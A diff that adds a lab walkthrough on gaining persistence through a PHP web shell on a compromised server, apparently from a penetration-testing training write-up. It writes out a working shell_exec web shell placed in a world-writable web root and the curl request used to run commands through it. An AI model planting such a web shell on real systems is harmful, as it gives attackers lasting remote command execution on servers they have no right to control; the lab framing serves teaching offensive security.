@@ -287,6 +287,60 @@ This is the another way we can create a Persistence or Maintaining Access.
 
 ========================================completed=======================================
 
+Technique 5: Create Persistence through WebShells
+
+Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network.
+
+Procedure:
+
+In this lab we have ssh credentials of target system because Persistence is a POST EXPLOITATION technique so we assume that we already exploited the target.
+
+But in target there is one condition, there is one file named "wait", if we delete that file password of user "student" changes automatically and SSH session terminates.
+
+For this condition to maintain access we have to use WebShell.
+
+Now we are successfully login on target machine as a "student" user by below command
+
+ssh student@target_IP
+password:********
+
+Now we are checking processes running on target 
+
+ps -eaf
+
+From above command, we come to know that Nginx web server and PHP fpm are running on the machine.
+
+Now cheking whether the web root folder is world writable or not.
+
+ls -l /var/www/
+
+web root folder is world writable means everyone can write on this folder.
+
+Since the web root directory is world writable. A PHP webshell can be created in the web root directory. Create a PHP webshell in /var/www/html directory.
+
+<?php
+$output=shell_exec($_GET["cmd"]);
+echo $output;
+?>
+Now WebShell is created named "shell.php" so now we are going to delete "wait" file. Once we delete that file as per lab description our SSH session terminated.
+
+rm wait
+
+SSH session is terminated
+
+Now we dont have new password of target server but we have created Persistence through the uploaded PHP WebShell.
+
+So execute commands on the target machine:
+
+curl "target_ip/shell.php?cmd=id"
+
+Once we execute this command we get the output in attacker's machine. In this way we can create Persistence through WebShells.
+
+============================================================Completed================================================
+
+
+
+
 
 
 
